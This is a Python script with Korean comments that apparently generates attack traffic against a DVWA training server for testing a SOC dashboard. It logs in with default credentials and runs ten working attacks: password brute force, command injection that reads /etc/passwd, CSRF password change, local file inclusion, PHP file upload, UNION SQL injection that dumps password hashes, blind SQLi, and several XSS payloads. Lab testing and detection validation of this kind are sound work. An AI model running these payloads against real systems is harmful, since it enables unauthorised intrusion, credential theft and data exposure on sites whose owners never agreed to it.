import requests
import time
import sys
import re
import itertools
import string
import urllib3

# SSL 경고 무시
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# 전역 설정
# ==========================================
HEADERS = {"User-Agent": "AI-SOC-Tester-Real"}
session = requests.Session()
BASE_URL = ""

def auto_login(ip):
    global BASE_URL
    if not ip.startswith("http"):
        BASE_URL = f"http://{ip}"
    else:
        BASE_URL = ip
    
    # URL 끝 슬래시 제거
    BASE_URL = BASE_URL.rstrip("/")
    login_url = f"{BASE_URL}/login.php"
    
    print(f"\n[*] {BASE_URL}/login.php DVWA 서버로 자동 로그인을 시도합니다...")
    try:
        # 1. 로그인 페이지 접속하여 CSRF 토큰 획득
        res_get = session.get(login_url, headers=HEADERS, timeout=10, verify=False)
        token_match = re.search(r"name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"]", res_get.text)
        user_token = token_match.group(1) if token_match else ""
            
        login_data = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": user_token
        }
        
        # 2. 로그인 POST 요청
        session.post(login_url, data=login_data, headers=HEADERS, allow_redirects=True, verify=False)
        
        # 3. 도메인 지정 쿠키 설정 (로그인 안정화 핵심)
        domain = re.sub(r'https?://', '', BASE_URL).split(':')[0]
        session.cookies.set("security", "low", domain=domain)
        
        res_index = session.get(f"{BASE_URL}/index.php", headers=HEADERS, verify=False)
        if "Welcome" in res_index.text or "Security Level: low" in res_index.text:
            print("[+] 로그인 및 보안 레벨(LOW) 설정 완료!")
            return True
        else:
            print("[-] 로그인 실패. 아이디/패스워드 또는 URL을 확인하세요.")
            return False
            
    except Exception as e:
        print(f"[-] 서버 통신 실패: {e}")
        return False

# ==========================================
# 공격 함수 (롤백 버전)
# ==========================================

def attack_1_brute_force():
    print("\n[1] Brute Force 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/brute/"
    prefix = "passwo"
    charset = string.ascii_lowercase + string.digits
    for guess_tuple in itertools.product(charset, repeat=2):
        guess_pw = prefix + ''.join(guess_tuple)
        params = {"username": "admin", "password": guess_pw, "Login": "Login"}
        try:
            res = session.get(url, params=params, headers=HEADERS, verify=False)
            if "Welcome" in res.text:
                print(f"  🎉 [성공] 비밀번호 탈취 완료: {guess_pw}")
                return True
        except: pass
    return False

def attack_2_command_injection():
    print("\n[2] Command Injection 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/exec/"
    data = {"ip": "127.0.0.1 && cat /etc/passwd", "Submit": "Submit"}
    try:
        res = session.post(url, data=data, headers=HEADERS, verify=False)
        if "root:x:0:0:" in res.text:
            leaked = re.search(r"root:x:0:0:.*", res.text)
            print(f"  🎉 [성공] 유출 데이터: {leaked.group(0) if leaked else '데이터 확인됨'}")
            return True
    except: pass
    return False

def attack_3_csrf():
    print("\n[3] CSRF 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/csrf/"
    params = {"password_new": "hacked123", "password_conf": "hacked123", "Change": "Change"}
    try:
        res = session.get(url, params=params, headers=HEADERS, verify=False)
        if "Password Changed." in res.text:
            print("  🎉 [성공] 관리자 비밀번호가 'hacked123'으로 강제 변경되었습니다.")
            return True
    except: pass
    return False

def attack_4_lfi():
    print("\n[4] File Inclusion (LFI) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/fi/"
    params = {"page": "/etc/passwd"}
    try:
        res = session.get(url, params=params, headers=HEADERS, verify=False)
        if "root:x:0:0:" in res.text:
            leaked = re.search(r"root:x:0:0:.*", res.text)
            print(f"  🎉 [성공] 시스템 파일 유출: {leaked.group(0) if leaked else '데이터 확인됨'}")
            return True
    except: pass
    return False

def attack_5_file_upload():
    print("\n[5] File Upload 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/upload/"
    files = {'uploaded': ('poc.php', '<?php phpinfo(); ?>', 'application/x-php')}
    data = {"Upload": "Upload"}
    try:
        res = session.post(url, files=files, data=data, headers=HEADERS, verify=False)
        # DVWA 서버 응답 오타('succesfully') 고려 및 유연한 매칭
        if "uploaded!" in res.text.lower() or "succesfully" in res.text.lower():
            print("  🎉 [성공] 웹쉘 업로드 완료")
            return True
    except: pass
    return False

def attack_6_sqli():
    print("\n[6] SQL Injection 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    params = {"id": "1' UNION SELECT user, password FROM users #", "Submit": "Submit"}
    try:
        res = session.get(url, params=params, headers=HEADERS, verify=False)
        hashes = re.findall(r"[a-f0-9]{32}", res.text)
        users = re.findall(r"First name: ([a-zA-Z0-9_]+)", res.text)
        if hashes:
            print("  🎉 [성공] DB 사용자 정보 탈취 완료.")
            for u, h in zip(users, hashes):
                print(f"  [🔓 유출 데이터] ID: {u.ljust(10)} | MD5 해시: {h}")
            return True
    except: pass
    return False

def attack_7_sqli_blind():
    print("\n[7] Blind SQLi 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/sqli_blind/"
    params = {"id": "1' AND SLEEP(3) #", "Submit": "Submit"}
    try:
        start = time.time()
        session.get(url, params=params, headers=HEADERS, verify=False)
        if time.time() - start >= 3:
            print(f"  🎉 [성공] 시간 지연(Blind SQLi) 확인: {time.time()-start:.2f}초")
            return True
    except: pass
    return False

def attack_8_xss_r():
    print("\n[8] XSS Reflected 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_r/"
    payload = "<script>alert(1)</script>"
    try:
        res = session.get(url, params={"name": payload}, headers=HEADERS, verify=False)
        if payload in res.text:
            print("  🎉 [성공] 스크립트 반사 확인")
            return True
    except: pass
    return False

def attack_9_xss_s():
    print("\n[9] XSS Stored 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_s/"
    payload = "<u>test</u>"
    try:
        session.post(url, data={"txtName": "H", "mtxMessage": payload, "btnSign": "Sign+Guestbook"}, headers=HEADERS, verify=False)
        res = session.get(url, headers=HEADERS, verify=False)
        if payload in res.text:
            print("  🎉 [성공] 스크립트 저장 확인")
            return True
    except: pass
    return False

def attack_10_xss_d():
    print("\n[10] XSS DOM 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_d/"
    payload = "<script>alert(1)</script>"
    try:
        res = session.get(url, params={"default": f"English{payload}"}, headers=HEADERS, verify=False)
        # DOM XSS는 파이썬(requests)에서 JS를 실행하지 않으므로, URL에 파라미터가 정상 주입되었는지 확인하는 방식이 최선임
        if "default=" in res.url:
            print("  🎉 [성공] DOM 조작 파라미터 전달 확인")
            return True
    except: pass
    return False

def reset_password():
    print("\n[*] 환경 초기화: 관리자 비밀번호를 기본값('password')으로 복구합니다...")
    url = f"{BASE_URL}/vulnerabilities/csrf/"
    params = {"password_new": "password", "password_conf": "password", "Change": "Change"}
    try:
        session.get(url, params=params, headers=HEADERS, verify=False)
        print("  [+] 비밀번호 복구 완료.")
    except Exception as e:
        print(f"  [-] 비밀번호 복구 실패: {e}")

if __name__ == "__main__":
    print("🚀 SOC 대시보드 검증용 실전 Exploit 자동화 봇 (요청하신 안정 버전 롤백) 🚀\n")
    target_ip = input("타겟 서버의 IP를 입력하세요: ")
    
    if auto_login(target_ip):
        print("-" * 50)
        results = {
            "Brute Force": attack_1_brute_force(),
            "Command Injection": attack_2_command_injection(),
            "CSRF": attack_3_csrf(),
            "LFI": attack_4_lfi(),
            "File Upload": attack_5_file_upload(),
            "SQLi": attack_6_sqli(),
            "Blind SQLi": attack_7_sqli_blind(),
            "XSS Reflected": attack_8_xss_r(),
            "XSS Stored": attack_9_xss_s(),
            "XSS DOM": attack_10_xss_d()
        }
        
        print("\n" + "=" * 50)
        print("📊 최종 모의해킹 공격 결과 요약")
        for k, v in results.items():
            print(f" - {k.ljust(20)}: {'✅ 성공' if v else '❌ 실패'}")
        print("=" * 50)
        
        # 공격이 끝난 후 비밀번호를 원래대로 되돌려 다음 테스트를 준비함
        reset_password()
